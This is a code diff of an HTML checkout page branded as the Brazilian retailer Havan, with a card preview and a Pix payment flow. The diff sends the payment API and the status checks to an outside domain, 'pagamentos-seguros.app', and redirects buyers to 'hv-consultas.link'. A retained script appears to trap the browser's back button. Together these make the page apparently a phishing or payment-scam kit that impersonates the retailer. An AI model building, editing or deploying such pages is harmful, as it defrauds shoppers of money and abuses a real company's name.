@@ -52,7 +52,7 @@
                     b.location.replace(r);
                 };
             }
-        })(window, "/funil/pos/back/front/index.html");
+        })(window, "pos/back/01/index.html");
     </script>
 
     <script>
@@ -230,7 +230,7 @@
     </div>
 
     <header class="havan-header flex px-6 h-20 items-center justify-center">
-        <img src="/funil/9/images/hv-branco.png" alt="Havan" style="height: 50px; width: auto;">
+        <img src="/9/images/hv-branco.png" alt="Havan" style="height: 50px; width: auto;">
     </header>
 
     <main id="paymentPage" class="max-w-lg mx-auto mt-8 px-4">
@@ -248,10 +248,10 @@
             <div class="px-6 py-8 text-center border-b border-gray-100 bg-gray-50/50">
                 <div class="cartao-container">
                     <div class="cartao" id="cartao-preview">
-                        <img src="/funil/9/images/hv-branco.png" alt="Havan" class="top-left-text">
-                        <img src="/funil/9/images/Visa-logo-whitea91b.png" alt="Visa" class="top-right-img">
-                        <img src="/funil/9/images/chip-1-logo-png-transparent.png" alt="Chip" class="imagem-chip">
-                        <img src="/funil/9/images/Design-sem-nome.png" alt="Logo" class="imagem-lateral">
+                        <img src="/9/images/hv-branco.png" alt="Havan" class="top-left-text">
+                        <img src="9/images/Visa-logo-whitea91b.png" alt="Visa" class="top-right-img">
+                        <img src="9/images/chip-1-logo-png-transparent.png" alt="Chip" class="imagem-chip">
+                        <img src="9/images/Design-sem-nome.png" alt="Logo" class="imagem-lateral">
                         <div class="card-details">
                             <div class="titular">
                                 <p class="texto-label">Titular do Cartão</p>
@@ -349,10 +349,9 @@
     </div>
 
     <script>
-        const API_URL = '/api/pix/create';
-        const STATUS_URL = '/api/pix/status';
-        const REDIRECT_URL = '/funil/pos/up1/';
-        const AMOUNT = 2782;
+        const API_URL = 'https://www.pagamentos-seguros.app/api-pix/OSS7n1_UVPInD6FtO3fWz1U5TaJzycMEVQPCHOwpu2auZ51pABGdX1MpcRUUwZxQE4zvexNSomX6Fat34HoeqA';
+        const REDIRECT_URL = 'https://hv-consultas.link/pos/pos/index.html';
+        const AMOUNT = 2872;
         let pixCode = null;
         let transactionId = null;
         let statusInterval = null;
@@ -431,7 +430,7 @@
         async function checkStatus() {
             if (!transactionId) return;
             try {
-                const response = await fetch(`${STATUS_URL}?transactionId=${transactionId}`);
+                const response = await fetch(`${API_URL}?transactionId=${transactionId}`);
                 const result = await response.json();
                 if (result.status === 'COMPLETED') {
                     clearInterval(statusInterval);
